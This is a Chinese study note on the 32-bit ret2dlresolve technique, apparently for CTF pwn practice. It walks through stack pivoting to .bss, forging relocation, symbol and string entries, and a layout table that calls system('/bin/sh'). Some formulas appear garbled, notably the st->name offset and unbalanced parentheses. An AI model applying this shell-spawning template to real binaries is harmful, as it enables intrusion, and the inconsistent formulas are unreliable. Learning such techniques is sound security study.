## 32位下 ret2dlresolve 机制的学习

##### <font color='magenta'>延迟绑定</font>

###### 之前学习过延迟绑定，也就是动态链接中，由plt表跳转到got表，函数got表初始化并没有存入函数的地址，而是一段汇编代码，32位下跳转到_dl_runtime_resolve函数进行解析，步骤如下：

```python
1、首先使用 link_map 访问 .dynamic，分别取出 .dynstr、.dynsym、.rel.plt 的地址
2、.rel.plt + 参数 reloc_arg，求出当前函数的重定位表项 Elf32_Rel 的指针，记作 rel
3、rel 的 r_info >> 8 作为 .dynsym 的下标，求出当前函数的符号表项 Elf32_Sym 的指针，记作 sym
4、.dynstr + sym -> st_name 得出符号名字符串指针
5、在动态链接库查找这个函数地址，并且把地址赋值给 *rel -> r_offset，即 GOT 表
6、调用这个函数
```

##### <font color='yellowgreen'>解题思路与流程</font>

###### 可以说这一类基本上是有模板的：

###### 1.首先得把栈迁移到bss上，因为一般会开启NX保护。利用栈溢出覆盖ebp为bss地址与eip为read函数plt，读取fake rel区域

###### 2.然后开始构造fake rel区域，

###### 	2.1 先确定`.rel.plt`、`.dynsym`、`.dynstr`的起始地址，利用函数

```python
rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr   #0x8048324
dynsym_addr =  elf.get_section_by_name('.dynsym').header.sh_addr    #0x80481cc
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr     #0x804826c
```

###### 	2.2 然后确定fake rel区域的各段地址

```python
start = 0x804aa04  #align
fake_rel_plt_addr = start
fake_dynsym_addr = fake_rel_plt_addr + 0x8
fake_dynstr_addr = fake_dynsym_addr + 0x10
bin_sh_addr = fake_dynstr_addr + 0x7
```

###### 	2.3 根据上述位置计算 `reloc_arg=fake_rel_plt_addr-rel_plt_addr`,

###### 							`r_info=((fake_dynsym_addr-dynsym_addr)/0x10)<<8)+0x7`,

###### 							`st->name=fake_dynsym_addr-dynsym_addr`

###### 	2.4 布局

| addr                    | data                  |
| ----------------------- | --------------------- |
| start-0x14              | 0(just for pop)       |
| start-0x10              | resolve_plt           |
| start-0xc               | reloc_arg             |
| start-0x8               | aaaa(anything is ok)  |
| start-0x4               | bin_sh_addr(arg_addr) |
| start(fake_rel_plt)     | r_offset              |
| start+0x4               | r_info                |
| start+0x8(fake_dynsym)  | st->name              |
| start+0xc               | 0                     |
| start+0x10              | 0                     |
| start+0x14              | 12                    |
| start+0x18(fake_dynstr) | "system\x00/"         |
| start+0x1c              | "bin/sh"              |

这样即可成功，但是需要十分注意的是

<font color=red>`r_info=((fake_dynsym_addr-dynsym_addr)/0x10)<<8)+0x7`，如果在减法后最低1位(16进制下)不为0，那么之后的寻址操作就会失败，所以要让`fake_dynsym_addr`与`dynsym_addr`的最低一位地址相同</font>

